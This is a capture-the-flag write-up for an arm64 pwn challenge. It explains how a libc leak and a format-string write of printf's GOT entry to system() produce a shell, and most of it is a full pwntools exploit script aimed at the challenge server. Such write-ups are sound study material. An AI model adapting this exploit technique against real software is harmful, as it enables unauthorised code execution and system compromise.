# army

## problem

But can you get a shell? (same attachments as pwny, the challenge runs on Ubuntu 20.)

see [chal](./chal) and [libc.so.6](./libc.so.6) 

## solution

one of the annoying things about this challenge is that it's arm64 which means i have to use qemu to run it and debug it which took hours to set up

fortunately, this one wasn't too hard

here we had to leak the libc address (an address close by to the libc address was on the stack iirc)

we know the system address because it is always at a specified location if you know the libc address

then, we had to overwrite the GOT PLT printf to redirect execution to the system() function, and because the vuln() also happens to print out whatever input you put in, we can put in `/bin/sh` as our next input to get a shell

this solution also utilized the format string exploit (see [pwny](../pwny) for more info)

```py
from pwn import *

context.arch = 'arm64'

context.bits = 64
context.endian = 'little'

# libc = ELF("./local-libc.so.6")
libc = ELF("./libc.so.6")

libc_offset = libc.symbols['__libc_start_main']
system_offset = libc.symbols['system']

# p: tubes.process.process = gdb.debug(["./chal"], "break vuln")
p = remote("155.248.203.119", 42051)
# p = process(["./chal"])
vuln_address = 0x4007ec
printf_got_plt_address = 0x411038
puts_plt_address = 0x400630
libc_start_address = 0x411010

p.sendline(p64(libc_start_address) + p32(printf_got_plt_address) + b'\x00'*4 + cyclic(48) + b'\x00' * 8 + p64(vuln_address))

p.sendline(b'%10$s')

p.recv()  # remove pwny message
# p.recv()
# p.recv()

gotten = p.recvline().rstrip(b"\n").hex().ljust(16, '0')

remote_libc_start_address = int.from_bytes(bytes.fromhex(gotten), byteorder="little")

if remote_libc_start_address < 0x1_00_00_00_00:
    remote_libc_start_address += 0x55_00_00_00_00

print(f"__libc_start_main: {remote_libc_start_address} ({remote_libc_start_address.to_bytes(8, 'big').hex()})")

libc_base_address = remote_libc_start_address-libc_offset

print(f"libc base: {libc_base_address} ({libc_base_address.to_bytes(8, 'big').hex()})")

system_address = libc_base_address+system_offset

print(f"system address: {system_address} ({system_address.to_bytes(8, 'big').hex()})")

lined = b"%" + str(system_address & 0xffff).encode() + b"x%11$hn"
print("lined:" + lined.decode('ascii'))
p.sendline(lined)

p.sendline(b"%11$s")

print("thing:" + p.recvline().hex().rstrip("0a"))

p.interactive()
```
